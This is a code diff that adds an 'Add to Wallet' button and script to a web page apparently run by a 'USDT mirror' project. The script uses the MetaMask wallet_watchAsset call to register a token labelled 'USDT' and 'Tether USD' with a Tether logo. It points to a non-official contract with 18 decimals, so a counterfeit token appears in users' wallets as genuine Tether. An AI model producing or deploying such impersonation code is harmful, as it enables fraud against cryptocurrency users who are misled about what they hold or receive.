@@ -48,6 +48,38 @@
         Contact us at: usdtmirror.project@gmail.com
     </div>
 </div>
+<button onclick="addToken()" class="btn">Add to Wallet (Logo Support)</button>
 
+<script>
+async function addToken() {
+  const tokenAddress = '0xb35fa90912e7fa4a69c467272422f2770bd8e57b';
+  const tokenSymbol = 'USDT';
+  const tokenDecimals = 18;
+  const tokenImage = 'https://abir1987.github.io/Tether-USDT/logo.svg';
+
+  try {
+    // was added to wallet
+    const wasAdded = await window.ethereum.request({
+      method: 'wallet_watchAsset',
+      params: {
+        type: 'ERC20', 
+        options: {
+          address: tokenAddress, 
+          symbol: tokenSymbol, 
+          decimals: tokenDecimals, 
+          image: tokenImage, 
+        },
+      },
+    });
+
+    if (wasAdded) {
+      alert('Tether USD added successfully!');
+    }
+  } catch (error) {
+    console.log(error);
+    alert('Please open this site inside Trust Wallet or MetaMask browser.');
+  }
+}
+</script>
 </body>
 </html>
